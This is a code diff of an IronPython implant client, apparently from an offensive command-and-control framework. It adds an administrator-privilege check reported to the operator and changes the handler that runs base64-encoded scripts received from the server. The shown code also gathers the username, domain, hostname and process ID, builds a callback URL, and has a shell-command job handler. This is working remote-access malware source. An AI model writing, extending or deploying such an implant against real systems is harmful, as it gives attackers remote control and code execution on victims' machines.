@@ -15,6 +15,7 @@ from System.Text import Encoding
 from System import Convert, Guid, Environment, Uri, Console
 from System.Management import ManagementObject
 from System.Diagnostics import Process
+from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
 from System.IO import StreamReader, Stream
 from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache
 from System.Net.Security import RemoteCertificateValidationCallback
@@ -146,6 +147,7 @@ class STClient(Serializable):
         self.URL = str(Uri(Uri(URL), self.GUID))  # This needs to be a tuple of callback domains (eventually)
         self.USERNAME = Environment.UserName
         self.DOMAIN = Environment.UserDomainName
+        self.HIGH_INTEGRITY = self.is_high_integrity()
         #self.IP = ManagementObject("Win32_NetworkAdapterConfiguration")
         #self.OS = ManagementObject("Win32_OperatingSystem")
         self.PROCESS = p.Id
@@ -153,9 +155,14 @@ class STClient(Serializable):
         self.HOSTNAME = Environment.MachineName
         self.JOBS = []
 
+    def is_high_integrity(self):
+        identity = WindowsIdentity.GetCurrent()
+        principal = WindowsPrincipal(identity)
+        return principal.IsInRole(WindowsBuiltInRole.Administrator)
+
     def run_job(self, job, requests):
         payload = {'id': job['id']}
-        if DEBUG: print "Running job (id: {}): {}".format(job['id'], job)
+        if DEBUG: print "Running job (id: {})".format(job['id'])
         try:
             result = getattr(self, job['command'])(job['args'], job['data'])
             payload['state'] = 'success'
@@ -177,15 +184,14 @@ class STClient(Serializable):
 
     def run_script(self, args, data):
         script = Encoding.UTF8.GetString(Convert.FromBase64String(data))
-        engine = Python.CreateEngine()
         stream = MuhStream()
+        engine = Python.CreateEngine()
         engine.Runtime.IO.SetOutput(stream, Encoding.UTF8)
         engine.Runtime.IO.SetErrorOutput(stream, Encoding.UTF8)
-        #hosted_sys = Python.GetSysModule(engine)
-        #hosted_sys.path = sys.path
-        #hosted_sys.meta_path = sys.meta_path
-        #script = bytes(script).decode("UTF-8")
-        engine.Execute(script)
+        scope = engine.CreateScope()
+        scope.SetVariable("requests", requests)
+        scope.SetVariable("client", self)
+        engine.Execute(script, scope)
         return stream.string
 
     def shell(self, args, data):
@@ -197,6 +203,7 @@ class STClient(Serializable):
     def sleep(self, args, data):
         Thread.Sleep(int(args))
         return 'Done'
+
 
 requests = Requests()
 client = STClient()
